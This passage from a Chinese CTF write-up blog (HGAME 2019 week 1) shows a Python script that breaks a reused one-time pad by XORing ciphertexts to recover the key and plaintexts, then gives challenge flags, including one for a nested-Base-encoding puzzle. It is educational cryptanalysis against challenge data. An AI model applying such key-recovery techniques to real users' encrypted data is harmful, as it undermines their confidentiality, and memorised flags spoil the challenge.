&#x27;c4ac0e53c98d7a8286df84936bc8c84d5b50889aedfebfba18d28352daf7cfa3a6920a3c&#x27;,</span><br><span class="line">           &#x27;d9aa4f548c9a609ed297969739d18d5a146c8adebef1bcad11d49252c7bfd1f1bc87152b5bbc07dd4fd226948397&#x27;,</span><br><span class="line">           &#x27;c4a40e698c9d6088879397d626c0c84d5b6d8edffbb792b902d49452ffbec6b6ef8e193840&#x27;,</span><br><span class="line">           &#x27;c5ad5900df8667929e9bd3bf6bc2df5c1e6dc6cef6f2b6ff21d8921ab3a4c1bdaa991f3c12a949dd0ac5269c&#x27;]</span><br><span class="line"># The target ciphertext we want to crack</span><br><span class="line">target_cipher = &quot;c2967e7fc59d57899d8bac852ac3c866127fb9d7f1e5b68002d9871cccb8c6b2aa&quot;</span><br><span class="line"></span><br><span class="line"># XORs two string</span><br><span class="line">def strxor(a, b):     # xor two strings (trims the longer input)</span><br><span class="line">    return &quot;&quot;.join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])</span><br><span class="line"></span><br><span class="line"># To store the final key</span><br><span class="line">final_key = [None]*150</span><br><span class="line"># To store the positions we know are broken</span><br><span class="line">known_key_positions = set()</span><br><span class="line"></span><br><span class="line"># For each ciphertext</span><br><span class="line">for current_index, ciphertext in enumerate(ciphers):</span><br><span class="line">	counter = collections.Counter()</span><br><span class="line">	# for each other ciphertext</span><br><span class="line">	for index, ciphertext2 in enumerate(ciphers):</span><br><span class="line">		if current_index != index: # don&#x27;t xor a ciphertext with itself</span><br><span class="line">			for indexOfChar, char in enumerate(strxor(ciphertext.decode(&#x27;hex&#x27;), ciphertext2.decode(&#x27;hex&#x27;))): # Xor the two ciphertexts</span><br><span class="line">				# If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&#x27;t know which one)</span><br><span class="line">				if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index</span><br><span class="line">	knownSpaceIndexes = []</span><br><span class="line"></span><br><span class="line">	# Loop through all positions where a space character was possible in the current_index cipher</span><br><span class="line">	for ind, val in counter.items():</span><br><span class="line">		# If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span><br><span class="line">		if val &gt;= 7: knownSpaceIndexes.append(ind)</span><br><span class="line">	#print knownSpaceIndexes # Shows all the positions where we now know the key!</span><br><span class="line"></span><br><span class="line">	# Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span><br><span class="line">	xor_with_spaces = strxor(ciphertext.decode(&#x27;hex&#x27;),&#x27; &#x27;*150)</span><br><span class="line">	for index in knownSpaceIndexes:</span><br><span class="line">		# Store the key&#x27;s value at the correct position</span><br><span class="line">		final_key[index] = xor_with_spaces[index].encode(&#x27;hex&#x27;)</span><br><span class="line">		# Record that we known the key at this position</span><br><span class="line">		known_key_positions.add(index)</span><br><span class="line"></span><br><span class="line"># Construct a hex key from the currently known key, adding in &#x27;00&#x27; hex chars where we do not know (to make a complete hex string)</span><br><span class="line">final_key_hex = &#x27;&#x27;.join([val if val is not None else &#x27;00&#x27; for val in final_key])</span><br><span class="line"># Xor the currently known key with the target cipher</span><br><span class="line">output = strxor(target_cipher.decode(&#x27;hex&#x27;),final_key_hex.decode(&#x27;hex&#x27;))</span><br><span class="line"></span><br><span class="line">print &quot;Fix this sentence:&quot;</span><br><span class="line">print &#x27;&#x27;.join([char if index in known_key_positions else &#x27;*&#x27; for index, char in enumerate(output)])+&quot;\n&quot;</span><br><span class="line"></span><br><span class="line"># WAIT.. MANUAL STEP HERE </span><br><span class="line"># This output are printing a * if that character is not known yet</span><br><span class="line"># fix the missing characters like this: &quot;Let*M**k*ow if *o&#123;*a&quot; = &quot;cure, Let Me know if you a&quot;</span><br><span class="line"># if is too hard, change the target_cipher to another one and try again</span><br><span class="line"># and we have our key to fix the entire text!</span><br><span class="line"></span><br><span class="line">#sys.exit(0) #comment and continue if u got a good key</span><br><span class="line"></span><br><span class="line">target_plaintext = &quot;cure, Let Me know if you a&quot;</span><br><span class="line">print &quot;Fixed:&quot;</span><br><span class="line">print target_plaintext+&quot;\n&quot;</span><br><span class="line"></span><br><span class="line">key = strxor(target_cipher.decode(&#x27;hex&#x27;),target_plaintext)</span><br><span class="line"></span><br><span class="line">print &quot;Decrypted msg:&quot;</span><br><span class="line">for cipher in ciphers:</span><br><span class="line">	print strxor(cipher.decode(&#x27;hex&#x27;),key)</span><br><span class="line"></span><br><span class="line">print &quot;\nPrivate key recovered: &quot;+key+&quot;\n&quot;</span><br><span class="line"></span><br><span class="line">print &quot;hgame&#123;OTP_is_not_safe_if_more_than_once&#125;&quot;</span><br></pre></td></tr></table></figure></div><p>脚本解出来的 flag 是</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*TP_:s_not_safe_if_more_tha&amp;_once</span><br></pre></td></tr></table></figure></div><p>把几个字符修复一下</p><p>flag: hgame{OTP_is_not_safe_if_more_than_once}</p><h2 id="Base全家"><a href="#Base全家" class="headerlink" title="Base全家"></a>Base全家</h2><p>给出一个很大的文件，里面是很多层编码嵌套起来的，推荐到<a class="link" target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>解密。</p><p>flag: hgame{40ca78cde14458da697066eb4cc7daf6}</p></div><div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8"><div class="article-copyright-info-container"><ul><li><strong>Title:</strong> HGAME 2019 week1</li><li><strong>Author:</strong> Catalpa</li><li><strong>Created at :</strong> 2019-02-02 00:00:00</li><li><strong>Updated at :</strong> 2024-10-17 08:49:46</li><li><strong>Link:</strong> https://wzt.ac.cn/2019/02/02/hgame-2019/</li><li><strong>License: </strong>This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.</li></ul></div></div><div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8"><div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="prev" rel="prev" href="/2019/02/13/pyc-simple/"><span class="left arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-left"></i> </span><span class="title flex justify-center items-center"><span class="post-nav-title-item">PYC 文件的简单分析</span> <span class="post-nav-item">Prev posts</span></span></a></div><div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="next" rel="next" href="/2019/01/20/pcb2018-online/"><span class="title flex justify-center items-center"><span class="post-nav-title-item">鹏程杯 2018 部分题目复现</span> <span class="post-nav-item">Next posts</span> </span><span class="right arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-right"></i></span></a></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><div class="toc-title">On this page</div><div class="page-title">HGAME 2019 week1</div><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%81%E5%90%83%E4%BA%86%E6%88%91%E7%9A%84-flag"><span class="nav-text">谁吃了我的 flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8D%A2%E5%A4%B4%E5%A4%A7%E4%BD%9C%E6%88%98"><span class="nav-text">换头大作战</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#very-easy-web"><span class="nav-text">very easy web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#can-u-find-me"><span class="nav-text">can u find me?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#brainfxxker"><span class="nav-text">brainfxxker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HelloRe"><span class="nav-text">HelloRe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E3%82%8F%E3%81%8B%E3%82%8A%E3%81%BE%E3%81%99"><span class="nav-text">わかります</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#r-amp-xor"><span class="nav-text">r &amp; xor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pro%E7%9A%84Python%E6%95%99%E5%AE%A4-%E4%B8%80"><span class="nav-text">Pro的Python教室(一)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babysc"><span class="nav-text">babysc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#aaaaaaaaaa"><span class="nav-text">aaaaaaaaaa</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%96%AF%E7%89%87%E6%8B%AF%E6%95%91%E4%B8%96%E7%95%8C1"><span class="nav-text">薯片拯救世界1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Steins-Gate"><span class="nav-text">Steins;Gate</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hidden-Image-in-LSB"><span class="nav-text">Hidden Image in LSB</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%93%E5%AD%97%E6%9C%BA"><span class="nav-text">打字机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Broken-Chest"><span class="nav-text">Broken Chest</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Try"><span class="nav-text">Try</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mix"><span class="nav-text">Mix</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#perfect-secrecy"><span class="nav-text">perfect_secrecy!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Base%E5%85%A8%E5%AE%B6"><span class="nav-text">Base全家</span></a></li></ol></div></div></div></div></div></div><div class="main-content-footer"><footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color"><div class="info-container py-3 text-center"><div class="text-center">&copy; <span>2018</span> - 2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration:0.5s;color:#f54545"></i>&nbsp;&nbsp;<a href="/">Catalpa</a><p class="post-count space-x-0.5"><span>67 posts in total </span><span>253.6k words in total</span></p></div><script data-swup-reload-script src="https://cn.vercount.one/js"></script><div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right"><span id="busuanzi_container_site_uv" class="lg:!block"><span class="text-sm">VISITOR COUNT</span> <span id="busuanzi_value_site_uv"></span> </span><span id="busuanzi_container_site_pv" class="lg:!block"><span class="text-sm">TOTAL PAGE VIEWS</span> <span id="busuanzi_value_site_pv"></span></span></div><div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left"><span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span> <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.1</a></span></div><div>Blog up for <span class="odometer" id="runtime_days"></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec</div><script data-swup-reload-script>try{function odometer_init(){document.querySelectorAll(".odometer").forEach(e=>{new Odometer({el:e,format:"( ddd).dd",duration:200})})}odometer_init()}catch(e){}</script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="article-tools-list"><li class="right-bottom-tools page-aside-toggle"><i class="fa-regular fa-outdent"></i></li></ul></div></div><div class="right-side-tools-container"><div class="side-tools-container"><ul class="hidden-tools-list"><li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-plus"></i></li><li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-minus"></i></li><li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center"><i class="fa-regular fa-moon"></i></li><li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center"><i class="fa-regular fa-arrow-down"></i></li></ul><ul class="visible-tools-list"><li class="right-bottom-tools toggle-tools-list flex justify-center items-center"><i class="fa-regular fa-cog fa-spin"></i></li><li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="image-viewer-container"><img src=""></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fa-solid fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa-solid fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="/js/libs/Swup.min.js"></script><script src="/js/libs/SwupSlideTheme.min.js"></script><script src="/js/libs/SwupScriptsPlugin.min.js"></script><script src="/js/libs/SwupProgressPlugin.min.js"></script><script src="/js/libs/SwupScrollPlugin.min.js"></script><script src="/js/libs/SwupPreloadPlugin.min.js"></script><script>const swup=new Swup({plugins:[new SwupScriptsPlugin({optin:!0}),new SwupProgressPlugin,new SwupScrollPlugin({offset:80}),new SwupSlideTheme({mainElement:".main-content-body"}),new SwupPreloadPlugin],containers:["#swup"]})</script><script src="/js/tools/imageViewer.js" type="module"></script><script src="/js/utils.js" type="module"></script><script src="/js/main.js" type="module"></script><script src="/js/layouts/navbarShrink.js" type="module"></script><script src="/js/tools/scrollTopBottom.js" type="module"></script><script src="/js/tools/lightDarkSwitch.js" type="module"></script><script src="/js/layouts/categoryList.js" type="module"></script><script src="/js/tools/localSearch.js" type="module"></script><script src="/js/tools/codeBlock.js" type="module"></script><script src="/js/layouts/lazyload.js" type="module"></script><script src="/js/tools/runtime.js"></script><script src="/js/libs/odometer.min.js"></script><link rel="stylesheet" href="/assets/odometer-theme-minimal.css"><script src="/js/libs/Typed.min.js"></script><script src="/js/plugins/typed.js" type="module"></script><div class="post-scripts" data-swup-reload-script><script src="/js/tools/tocToggle.js" type="module"></script><script src="/js/layouts/toc.js" type="module"></script><script src="/js/plugins/tabs.js" type="module"></script></div></body></html>